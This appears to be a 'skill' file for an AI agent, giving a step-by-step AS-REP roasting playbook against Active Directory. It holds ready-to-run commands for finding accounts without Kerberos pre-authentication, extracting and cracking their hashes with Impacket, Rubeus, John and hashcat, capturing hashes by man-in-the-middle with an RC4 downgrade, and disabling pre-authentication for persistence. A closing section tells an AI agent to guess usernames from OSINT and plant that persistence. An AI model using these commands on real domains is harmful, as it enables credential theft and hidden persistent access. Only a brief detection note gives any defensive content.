# AS-REP Roast Skill

## Goal

Extract and crack credentials for accounts with Kerberos pre-authentication disabled.

## Methodology

1. **Enumerate Targets:** Find accounts with DONT_REQ_PREAUTH flag
2. **Request AS-REP:** Get encrypted response without password
3. **Extract Hash:** Export in crackable format
4. **Crack Offline:** Use hashcat to recover password

## Key Points

- Targets accounts with pre-authentication disabled
- No password needed to request AS-REP
- Optional: Domain account helps enumerate vulnerable users
- Without credentials, must guess usernames

## Enumeration

### Windows

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired -verbose
```

### Linux

```bash
# bloodyAD
bloodyAD -u user -p 'password' -d domain.local --host <DC_IP> get search \
  --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' \
  --attr sAMAccountName
```

## Attack

### Linux

```bash
# Try all usernames in file
GetNPUsers.py domain.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

# With domain credentials
GetNPUsers.py domain.local/user:password -request -format hashcat -outputfile hashes.asreproast
```

### Windows

```powershell
# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast

# Target specific user
.\Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:hashes.asreproast
```

## Cracking

```bash
# John
john --wordlist=passwords.txt hashes.asreproast

# Hashcat - mode 18200
hashcat -m 18200 --force -a 0 hashes.asreproast passwords.txt
```

## Persistence

If you have GenericAll on an account:

### Windows

```powershell
# Disable pre-auth requirement
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

### Linux

```bash
bloodyAD -u user -p 'password' -d domain.local --host <DC_IP> add uac -f DONT_REQ_PREAUTH 'target_user'
```

## Without Credentials

Use ASRepCatcher for MITM capture:

```bash
# Active proxy mode, forcing RC4 downgrade
ASRepCatcher relay -dc $DC_IP

# Passive listening
ASRepCatcher listen
```

## Detection

- Event ID 4768 with encryption type 0x17 and preauth type 0
- Monitor for AS-REQ without pre-authentication data

## Tools

* **GetNPUsers.py** - Impacket AS-REP roasting
* **Rubeus** - Windows Kerberos toolkit
* **ASRepCatcher** - MITM AS-REP capture
* **hashcat** - Password cracking

## Guidance for AI

* Activate for Active Directory engagements
* Check for users without pre-auth first
* No credentials? Try usernames from OSINT
* ASRepCatcher works for all users via MITM
* Consider enabling DONT_REQ_PREAUTH for persistence
